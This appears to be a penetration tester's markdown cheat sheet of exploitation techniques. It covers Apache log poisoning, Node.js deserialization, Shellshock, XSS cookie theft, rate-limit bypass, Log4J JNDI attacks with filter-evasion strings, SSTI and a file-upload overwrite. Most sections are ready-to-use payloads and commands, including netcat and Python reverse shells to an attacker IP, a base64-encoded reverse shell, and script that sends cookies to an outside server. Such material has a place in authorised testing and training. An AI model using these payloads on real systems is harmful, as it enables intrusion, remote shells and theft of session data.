# Exploitations techniques

## Summary
- [Log poisoning on Apache server](#log-poisoning-on-apache-server)
- [Node.js deserialization](#nodejs-deserialization)
- [Exploiting shellshock](#exploiting-shellshock)
- [Steal cookies with XSS](#steal-cookies-with-xss)
- [Bypass rate-limit filter](#bypass-rate-limit-filter)
- [Log4J exploitation](#log4j-exploitation)
  - [Verify the vulnerability](#verify-the-vulnerability)
  - [Exploit 1](#exploit-1)
  - [Exploit 2](#exploit-2)
  - [JNDI payload bypass](#jndi-payload-bypass)
- [Exploiting SSTI](#exploiting-ssti)
  - [Getting RCE](#getting-rce)
- [File replace with file upload vulnerability](#file-replace-with-file-upload-vulnerability)

## Log poisoning on Apache server
```
confirm the path of log files (apache2 - /var/log/apache2/access.log
intercept request of the web page that is vulnerable to lfi
add { <?php passthru($_GET['cmd']); ?> } in user agent
								or
	  add <?php file_put_contents('reverse.php', file_get_contents('[url+reverse.php]')); ?> in user agent
	  							or
	  use exploit/multi/script/web_delivery on metasploit to craft a simple payload
request the url to read the log file and include "cmd" parameter to execute commands
execute wget command to download php reverse shell from local machine
execute the php reverse shell while the listener is up
get the reverse shell
```
## Node.js deserialization
```
use nodejsshell.py to create a payload
		:: {"rce":"_$$ND_FUNC$$_function (){ [PUT THE PAYLOAD HERE!!!!]}()"}
intercept the vulnerable website page with burpsuite
encode the payload created into base64
replace the encoded payload with the cookies in the intercepted website page in burpsuite
set up a listener
	
{"email":"test@test.com","rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.231 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) }); }()"}
```

## Exploiting Shellshock
```
find the attack vector for shellshock exploit to be successful e.g --> cgi-bin script
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" "http://ip/cgi-bin/test.cgi" 
execute reverse shell command to get reverse shell
```

## Steal cookies with XSS
```
start a php server on local machine
		:: php -S local-ip:port
paste below code on the page where the vulnerability is found
		:: <svg onload='var x = document.createElement("IFRAME");x.setAttribute("src", "http://10.4.64.135:8080/cookie?"+document.cookie);document.body.appendChild(x);''/>
```

## Bypass rate-limit filter
***Add below headers to the HTTP request***
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
```
***Use burpsuite or wfuzz to bruteforce POST HTTP data***
```
```wfuzz -c -z file,numbers.txt -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Host: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -d "number=FUZZ" --hw 81 http://example.com:80/
```

## Log4J exploitation
### Verify the vulnerability
```
setup a listener
nc -lvnp 4444	
find a location where you can supply JNDI syntax e.g -- url parameter & http headers
curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:4444\}'
the server will then try to connect to the ip address on port 4444 if there is a log4j vulnerability
```

### Exploit 1
```
starts a ldap server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS/#Exploit"
create a java exploit code as follow and save it as Exploit.java
public class Exploit {
				static {
					try {
						java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.4.64.135 4444");
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
		   }
compile Exploit.java with 'javac Exploit.java'
start a listener on port 4444
host the payload on a http.server
finally trigger the exploit by firing off the JNDI syntax
curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:1389/Exploit\}'
curl http://example.com/ -H 'X-Api-Version: ${jndi:ldap://10.4.64.135:1389/Exploit}'
the attack sequence is as follow
once the JNDI syntax is executed, it first connects to ldap server which will redirect to a http server
the http server will host a java payload with contains a reverse shell script
the vulnerable machine will execute the java payload and that will result us a reverse shell
```

### Exploit 2
```
run JNDI-Exploit-Kit
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "10.4.64.135:1389" -C "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC40LjY0LjEzNSA5OTk5ID4vdG1wL2Y= | base64 -d | bash"
set up a listener accordingly
trigger the exploit by firing off the JNDI syntax with the URL provided by JNDI-Exploit-Kit
curl http://example.com/ -H 'X-Api-Version: ${jndi:ldap://10.4.64.135:1389/vct1ie}'
curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:1389/vctlie}'
```

### JNDI payload bypass
```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
this uses RMI instead of LDAP

${${::-j}ndi:rmi://attackerendpoint.com/}
this uses RMI instead of LDAP
```

## Exploiting SSTI
```
http://example.com/404.page{{7+7}}
if the request is successful, the result of the addition will be displayed

http://example.com/404.page{{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR_IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
this will give us a reverse shell on port 9999
```

### Getting RCE
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("ping 10.10.1.10")}
```

## File replace with file upload vulnerability
```
example.com has a file upload functionality where we can upload any file but we cant trigger any kind of that files
assume we know the application has enabled debugger which means that the application will update its sources to any changes
the application's config file is views.py in /app/app directory on the server
customized the views.py and upload it, then intercept the request
in the intercepted request, change the file name to /app/app/views.py (absolute path so that the application will not ignore it) because we want to replace the original views.py in /app/app directory on the server instead of uploading the file to /uploads directory on the server
```
